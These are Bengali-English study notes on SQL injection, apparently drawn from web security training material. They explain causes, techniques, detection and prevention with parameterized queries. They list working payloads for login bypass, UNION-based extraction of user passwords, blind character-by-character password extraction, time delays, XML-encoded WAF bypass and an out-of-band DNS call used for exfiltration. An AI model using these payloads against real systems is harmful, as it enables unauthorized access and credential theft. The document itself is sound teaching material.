# SQL Injection (SQLi)

## 1. What is SQL Injection?

**Short Definition:**
SQL injection (SQLi) একটি web security vulnerability যা attacker-কে application-এর database-এ পাঠানো SQL query-তে ইন্টারফেয়ার করার সুযোগ দেয়।

**Detailed Explanation:**
সাধারণত একটি application তার database-এর সাথে যোগাযোগ করার জন্য SQL query ব্যবহার করে। SQLi vulnerability থাকলে attacker সেই query পরিবর্তন করে এমন data দেখতে পারে যা তার দেখার কথা নয়। এর মধ্যে অন্য user-দের data বা application-এর access থাকা যেকোনো data থাকতে পারে। অনেক ক্ষেত্রে attacker এই data modify বা delete করতে পারে, যার ফলে application-এর content বা behavior-এ persistent (স্থায়ী) পরিবর্তন ঘটে। কিছু পরিস্থিতিতে SQLi-এর মাধ্যমে underlying server বা back-end infrastructure compromise করা সম্ভব এবং এটি denial-of-service (DoS) attack-ও ঘটাতে পারে।

## 2. Why Does It Happen?

SQLi ঘটে কারণ application user input-কে নিরাপদ মনে করে সরাসরি SQL query-তে যুক্ত (concatenate) করে দেয়। যখন untrusted input-কে SQL query-র data হিসেবে না দেখে query-র অংশ (structure) হিসেবে process করা হয়, তখন attacker input-এর মাধ্যমে SQL command execute করতে পারে। Second-order SQLi-এর ক্ষেত্রে, developer-রা প্রাথমিকভাবে input database-এ নিরাপদভাবে store করলেও, পরবর্তীতে সেই stored data ব্যবহার করার সময় ভুলবশত সেটিকে trusted ধরে নেয় এবং unsafe ভাবে query-তে ব্যবহার করে।

## 3. How It Works

1. Application user-এর কাছ থেকে input রিসিভ করে (যেমন: URL parameter, form data, cookie)।
2. Application সেই input-কে সরাসরি একটি SQL query-র ভেতরে বসিয়ে দেয় কোনো proper validation বা parameterization ছাড়া।
3. Attacker input-এর মধ্যে বিশেষ SQL syntax (যেমন: `'`, `--`, `UNION`) যুক্ত করে দেয়।
4. Database যখন query-টি process করে, তখন সে attacker-এর দেওয়া input-কে সাধারণ data-এর বদলে SQL command হিসেবে interpret করে।
5. Security control bypass হয়ে যায় এবং database attacker-এর নির্দেশিত অতিরিক্ত বা পরিবর্তিত query execute করে।
6. Attacker unintended data access বা application-এর logic subvert করতে সক্ষম হয়।

## 4. Simple Example

**Retrieving hidden data:**
ধরা যাক একটি shopping application-এ `Gifts` category-র product দেখার জন্য নিচের URL ব্যবহার করা হয়:
`[https://insecure-website.com/products?category=Gifts](https://insecure-website.com/products?category=Gifts)`

Application নিচের SQL query execute করে:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

```

এখানে `released = 1` ব্যবহার করা হয়েছে শুধু রিলিজ হওয়া product দেখানোর জন্য।

**Modified request:**
Attacker URL-টি পরিবর্তন করে নিচের মতো দেয়:
`[https://insecure-website.com/products?category=Gifts'--](https://insecure-website.com/products?category=Gifts'--)`

**Result:**
Database-এ query-টি নিচের মতো execute হয়:

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1

```

এখানে `--` হলো SQL comment indicator। এর ফলে `--`-এর পরের অংশটুকু (অর্থাৎ `AND released = 1`) comment out হয়ে যায় এবং database তা মুছে ফেলে। ফলে category 'Gifts' এর সবগুলো product (এমনকি আনরিলিজডগুলোও) দেখা যায়।

## 5. Technical Example

**Subverting application logic (Authentication Bypass):**
ধরা যাক একটি login function নিচের query ব্যবহার করে:

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

```

যদি query কোনো user details রিটার্ন করে, তবে login সফল হয়।

Attacker username হিসেবে `administrator'--` এবং password খালি রাখে।
তখন server-এ query-টি দাঁড়ায়:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''

```

এখানে `--` password check-কে সম্পূর্ণভাবে comment out করে দেয়। ফলে query শুধু username check করে এবং attacker password ছাড়াই `administrator` হিসেবে লগইন করতে পারে।

## 6. Attack Flow

Attacker
↓
Find an entry point interacting with the database
↓
Submit SQL-specific syntax (e.g., `'`) to check for anomalies
↓
Modify input to alter the query logic
↓
Application passes the modified query to the database
↓
Database interprets the payload as SQL commands
↓
Unauthorized data retrieval / logic bypass / data modification

## 7. Important Conditions / Requirements

* User input অবশ্যই SQL query-তে ব্যবহৃত হতে হবে।
* Input-টি proper sanitization বা parameterization ছাড়া query-তে যুক্ত হতে হবে।
* UNION attack-এর জন্য: Injected query এবং original query-র column সংখ্যা সমান হতে হবে এবং data type compatible হতে হবে।
* Blind SQLi (Conditional)-এর জন্য: Injected true/false condition-এর ওপর ভিত্তি করে application-এর response বা error-এ detectable পার্থক্য থাকতে হবে।

## 8. Types / Variations

### A. Retrieving Hidden Data

**What is it?** SQL query modify করে additional results বের করে আনা।
**How does it work?** `OR` condition ব্যবহার করে query-র restriction bypass করা হয়।
**Example:** `category=Gifts'+OR+1=1--`
**Result:** `1=1` সবসময় true, তাই database সবগুলো item রিটার্ন করে।

### B. Subverting Application Logic

**What is it?** Query পরিবর্তন করে application-এর স্বাভাবিক logic-এ হস্তক্ষেপ করা।
**Example:** Login bypass করার জন্য username-এর পর comment indicator `--` ব্যবহার করা।

### C. UNION Attacks

**What is it?** `UNION` keyword ব্যবহার করে অন্য table থেকে data retrieve করে original query-র result-এর সাথে যুক্ত করে দেওয়া।
**Important Condition:** Column সংখ্যা এবং data type মিলতে হবে।

### D. Blind SQL Injection

**What is it?** যখন application SQL injection-এর শিকার হয়, কিন্তু HTTP response-এ SQL query-র result বা database error সরাসরি দেখা যায় না।
**How does it work?** Application-এর আচরণ (behavior) বা response time-এর পার্থক্য দেখে তথ্য অনুমান করতে হয়। এর কয়েকটি ভাগ আছে (নিচে বিস্তারিত আলোচনা করা হয়েছে)।

### E. Second-order SQL Injection (Stored SQLi)

**What is it?** Application প্রথমে HTTP request থেকে input নিয়ে safely database-এ store করে। কিন্তু পরবর্তীতে অন্য কোনো request handle করার সময় সেই stored data-কে unsafe ভাবে SQL query-তে ব্যবহার করে।
**Why it happens:** Developer-রা stored data-কে trusted মনে করে ভুল করে, কারণ প্রাথমিকভাবে এটি safely store করা হয়েছিল।

## 9. Different Contexts

SQLi সাধারণত `SELECT` query-র `WHERE` clause-এ দেখা যায়। তবে এটি অন্যান্য জায়গায়ও হতে পারে:

* `UPDATE` statement-এর updated values বা `WHERE` clause-এ।
* `INSERT` statement-এর inserted values-এ।
* `SELECT` statement-এর table বা column name-এ।
* `SELECT` statement-এর `ORDER BY` clause-এ।
* **Format Contexts:** URL, parameters, JSON, বা XML format-এ। বিশেষ করে XML বা JSON-এ WAF bypass করার জন্য character encoding ব্যবহার করা যেতে পারে (যেমন XML-এ `S`-এর বদলে `&#x53;` ব্যবহার করা)।

## 10. Exploitation / Practical Understanding

### Exploiting UNION Attacks

UNION attack সফল করতে দুটি জিনিস জানতে হয়:

1. Original query কয়টি column রিটার্ন করছে।
2. কোন column-গুলো string data type সাপোর্ট করে (কারণ আমরা সাধারণত string data এক্সট্রাক্ট করতে চাই)।

**Column সংখ্যা বের করার পদ্ধতি:**
`ORDER BY` পদ্ধতি:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

```

যতক্ষণ না error আসে, column index বাড়াতে থাকতে হবে। Error (যেমন: `out of range`) আসলে বুঝতে হবে column সংখ্যা তার চেয়ে এক কম।

`UNION SELECT NULL` পদ্ধতি:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

```

যতক্ষণ না error দূর হয় বা response-এ অতিরিক্ত null row দেখা যায়, NULL বাড়াতে হবে। `NULL` সব data type-এর সাথে compatible, তাই এটি ব্যবহার করা হয়।

**String Data Type বের করার পদ্ধতি:**

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--

```

প্রত্যেক column-এ পর্যায়ক্রমে `'a'` বসিয়ে দেখতে হবে। যদি database error না দেয় এবং response-এ `'a'` দেখা যায়, তার মানে ওই column string সাপোর্ট করে।

## 11. Step-by-Step Exploitation (Blind SQLi - Conditional Responses)

ধরা যাক application একটি tracking cookie ব্যবহার করে: `Cookie: TrackingId=xyz`
Step 1 — Identify input: Tracking cookie-টি SQL query-তে ব্যবহৃত হয়।
Step 2 — Test behavior: `xyz' AND '1'='1` দিলে "Welcome back" মেসেজ আসে। `xyz' AND '1'='2` দিলে মেসেজ আসে না।
Step 3 — Confirm vulnerability: Boolean condition-এর কারণে response পরিবর্তন হচ্ছে, অর্থাৎ Blind SQLi আছে।
Step 4 — Exploit: Password-এর প্রতিটি character এক এক করে বের করা।

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm

```

Step 5 — Verify: যদি "Welcome back" আসে, মানে character-টি `m`-এর চেয়ে বড়। এভাবে character-টি 's' কিনা তা `=` দিয়ে চেক করা যায়।

## 12. HTTP Requests / Responses

**XML Filter Bypass Example:**
অনেক সময় WAF সাধারণ SQL keywords ব্লক করে দেয়। XML input-এ এটি bypass করা যায়:

```xml
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>

```

**Explanation:** `&#x53;` হলো `S`-এর XML encoded রূপ। Server-side-এ এটি decode হয়ে `SELECT` হয়ে যায় এবং SQL interpreter-এর কাছে পৌঁছায়, যা WAF-কে ফাকি দিতে সাহায্য করে।

## 13. Payloads

* **Authentication Bypass:** `administrator'--`
* *Purpose:* Password check বাদ দিয়ে নির্দিষ্ট user হিসেবে লগইন করা।


* **Information Retrieval (UNION):** `' UNION SELECT username, password FROM users--`
* *Purpose:* `users` table থেকে data বের করে original response-এর সাথে যুক্ত করা।


* **Multiple values in single column (Oracle):** `' UNION SELECT username || '~' || password FROM users--`
* *Purpose:* Database যদি একটিমাত্র string column সাপোর্ট করে, তখন `||` ব্যবহার করে দুটি data একসাথে জুড়ে (concatenate) দেওয়া হয়।


* **Time Delay (Microsoft SQL Server):** `'; IF (1=1) WAITFOR DELAY '0:0:10'--`
* *Purpose:* Query-র response আসতে 10 সেকেন্ড দেরি করানো, যা blind SQLi confirm করে।


* **OAST DNS Lookup (Microsoft SQL Server):** `'; exec master..xp_dirtree '//subdomain.burpcollaborator.net/a'--`
* *Purpose:* Database-কে বাধ্য করা attacker-এর controlled domain-এ DNS request পাঠাতে।



## 14. Burp Suite Workflow

* **Burp Scanner:** অধিকাংশ SQLi vulnerability দ্রুত এবং reliably খুঁজে বের করতে ব্যবহার করা যায়।
* **Burp Collaborator:** Out-of-band (OAST) technique ব্যবহার করার জন্য সবচেয়ে সহজ tool। এটি DNS সহ বিভিন্ন network interaction detect করতে পারে। Payload-এ Collaborator-এর একটি unique subdomain ব্যবহার করা হয়, এবং interaction হলে Collaborator server-এ তা দেখা যায়।

## 15. How to Identify / Detect

Application-এর প্রতিটি entry point-এ systematic test করতে হবে:

1. **Single quote (`'`):** Error বা anomalous behavior লক্ষ্য করা।
2. **SQL syntax:** এমন syntax দেওয়া যা base value-তে পরিণত হয় এবং অন্য একটি ভিন্ন value-তে পরিণত হয়, তারপর response-এর systematic পার্থক্য লক্ষ্য করা।
3. **Boolean conditions:** `OR 1=1` এবং `OR 1=2` দিয়ে response-এর পার্থক্য দেখা।
4. **Time delays:** Time delay payload দিয়ে response আসতে কত সময় লাগছে তা মাপা।
5. **OAST payloads:** Out-of-band network interaction trigger করে তা monitor করা।

## 16. Common Mistakes

**Warning - Data Loss Risk:**
কখনো blindly `OR 1=1` ইনজেক্ট করা উচিত নয়। একটি request-এর data application অনেকগুলো query-তে ব্যবহার করতে পারে। যদি এই condition কোনো `UPDATE` বা `DELETE` statement-এ পৌঁছায়, তবে `1=1` সবসময় true হওয়ার কারণে database-এর বিশাল পরিমাণ ডেটা মুছে যেতে বা পরিবর্তন হয়ে যেতে পারে (Accidental loss of data)।

## 17. Limitations

* **UNION Attacks:** Original query-র column সংখ্যা এবং data type হুবহু মিলতে হবে।
* **Blind SQLi (Conditional/Error):** Application-এর response বা error handling-এ পার্থক্য থাকতে হবে। Error যদি gracefully handle করা হয়, তবে conditional error কাজ করবে না।
* **Time Delays:** Application-এর synchronous query processing প্রয়োজন। Asynchronous হলে response time-এ প্রভাব পড়বে না।
* **Parameterized Queries Limitation:** Prepared statements `WHERE`, `INSERT` বা `UPDATE` values-এর জন্য কাজ করে, কিন্তু table name, column name বা `ORDER BY` clause-এর জন্য কাজ করে না।

## 18. Edge Cases / Important Details

* **Asynchronous Processing:** যদি application user request-টি মূল thread-এ process করে এবং SQL query অন্য thread-এ (asynchronously) রান করে, তবে time delay বা conditional responses কাজ করবে না। এমন ক্ষেত্রে OAST/DNS technique ব্যবহার করতে হয়।
* **OAST Data Exfiltration:** OAST শুধু detection-এর জন্যই নয়, data exfiltrate করতেও ব্যবহৃত হয়। যেমন: password বের করে DNS request-এর subdomain হিসেবে জুড়ে দেওয়া (`S3cure.subdomain.burpcollaborator.net`)।
* **Verbose Errors (CAST technique):** `CAST()` function ব্যবহার করে string data-কে integer-এ convert করার চেষ্টা করলে, database error মেসেজেই ওই string data-টি প্রিন্ট করে দিতে পারে (e.g. `invalid input syntax for type integer: "Example data"`), যা blind SQLi-কে visible করে তোলে।

## 19. Database / Platform / Technology Differences

| Technology | Important Difference |
| --- | --- |
| **Oracle** | `SELECT` query-তে অবশ্যই `FROM` keyword থাকতে হবে। Dummy table হিসেবে `DUAL` ব্যবহৃত হয় (e.g., `FROM DUAL`)। String concatenate করতে `||` ব্যবহৃত হয়। |
| **MySQL** | `--` (double-dash) comment sequence-এর পর অবশ্যই একটি space (স্পেস) থাকতে হবে। বিকল্প হিসেবে `#` ব্যবহার করা যায়। |
| **Microsoft SQL Server** | Time delay-র জন্য `WAITFOR DELAY` ব্যবহৃত হয়। OAST-এর জন্য `master..xp_dirtree` ব্যবহৃত হয়। |

*Database-এর version জানতে:* Oracle-এ `SELECT * FROM v$version`। Table-এর লিস্ট জানতে অধিকাংশ database-এ `SELECT * FROM information_schema.tables`।

## 20. Impact

Successful SQL injection-এর ফলে:

* Sensitive data (Passwords, Credit cards, Personal info) চুরি হতে পারে।
* Data breach-এর কারণে reputational damage এবং regulatory fines হতে পারে।
* Persistent backdoor তৈরি হতে পারে, যা দীর্ঘমেয়াদী সার্ভার কম্প্রোমাইজের দিকে নিয়ে যায়।
* Underlying server বা back-end infrastructure compromise হতে পারে।

## 21. Prevention / Mitigation

SQL injection প্রতিরোধ করার মূল উপায় হলো **Parameterized queries (Prepared statements)** ব্যবহার করা।

* **Secure Implementation:** Query-র ভেতরে সরাসরি string concatenation ব্যবহার না করে placeholder (যেমন `?`) ব্যবহার করতে হবে। এতে user input-কে query-র structure হিসেবে নয়, শুধুমাত্র data হিসেবে বিবেচনা করা হয়।
* **Constraint:** যে string-টি query হিসেবে ব্যবহৃত হবে, তা অবশ্যই hard-coded constant হতে হবে। কোনো অবস্থাতেই এর ভেতরে variable data থাকা যাবে না।
* **Alternative for unsupported clauses:** Parameterized queries table/column name বা `ORDER BY` clause-এর জন্য কাজ করে না। এসব ক্ষেত্রে **Whitelisting** (permitted input values) অথবা different logic ব্যবহার করতে হবে।

## 22. Vulnerable vs Secure Example

**Vulnerable Code (Java):**

```java
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);

```

**Why vulnerable?** User input সরাসরি query-র string-এর সাথে যুক্ত (concatenate) করা হয়েছে।

**Secure Code (Java):**

```java
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();

```

**Why secure?** User input-কে `?` (placeholder) দিয়ে আলাদা করা হয়েছে এবং `setString` মেথডের মাধ্যমে strict data হিসেবে পাঠানো হয়েছে, যা query-র logic পরিবর্তন করতে পারবে না।

## 23. Real Understanding

SQL Injection মূলত একটি "trust" এবং "context" issue। Developer মনে করে user শুধু data পাঠাবে, কিন্তু attacker এমন data পাঠায় যা database-এর কাছে instruction বা command হিসেবে বিবেচিত হয়। Parameterized query না থাকলে data এবং code-এর মধ্যে পার্থক্য করার কোনো উপায় database-এর থাকে না। ফলে attacker query-র structure ভেঙে নিজের command ঢুকিয়ে দেয়। Blind SQLi-এর ক্ষেত্রে ফলাফল সরাসরি না দেখা গেলেও, attacker database-কে true/false প্রশ্ন করে বা time delay/network request-এর মাধ্যমে পরোক্ষভাবে ডেটা বের করে আনে।

## 24. Mental Model

User-controlled input (e.g., `' OR 1=1--`)
↓
Application concatenates it unsafely into the SQL string
↓
Database engine receives a structurally modified query
↓
Engine executes the attacker's logic instead of the developer's logic
↓
Security boundary is bypassed → Unauthorized access / modification

## 25. Quick Revision

* **Definition:** Database query-তে attacker-এর পাঠানো ক্ষতিকর input যা query logic পরিবর্তন করে।
* **Cause:** User input-কে সরাসরি SQL query-তে string concatenation করা।
* **Main idea:** Data-কে code হিসেবে execute করা।
* **Attack flow:** Find entry point → Inject payload (`'`, `--`, `UNION`) → DB processes it → Result achieved.
* **Important condition:** Input অবশ্যই DB query-তে proper parameterization ছাড়া ব্যবহৃত হতে হবে।
* **Main techniques:** In-band (UNION), Blind (Boolean, Error, Time delay, OAST).
* **Detection:** `'`, `OR 1=1`, time delay payload, Burp Collaborator ব্যবহার করে।
* **Impact:** Data breach, data manipulation, server compromise.
* **Prevention:** Parameterized queries (Prepared statements) ব্যবহার করা।

## 26. Things to Remember

* `OR 1=1` ইনজেক্ট করার সময় সতর্ক থাকতে হবে, কারণ এটি `UPDATE/DELETE`-এ গেলে ডাটা লস হতে পারে।
* UNION attack-এর জন্য column সংখ্যা এবং data type অবশ্যই মিলতে হবে।
* Oracle database-এ `SELECT` query-তে `FROM DUAL` ব্যবহার করতে হয় এবং concatenation-এর জন্য `||` ব্যবহৃত হয়।
* MySQL-এ `--`-এর পর space থাকা বাধ্যতামূলক, অথবা `#` ব্যবহার করতে হয়।
* Second-order SQLi-এ ডাটা প্রথমে নিরাপদে store হয়, কিন্তু পরে unsafe ভাবে ব্যবহৃত হয়।
* Parameterized queries `ORDER BY` বা table/column name-এ কাজ করে না; সেখানে whitelisting দরকার।
* OAST (Out-of-band) পদ্ধতি সবচেয়ে reliable, বিশেষ করে asynchronous query-র ক্ষেত্রে, এবং এটি দিয়ে data exfiltrate-ও করা যায়।
* XML/JSON format-এ WAF bypass করতে encoding (যেমন `&#x53;`) ব্যবহার করা যায়।

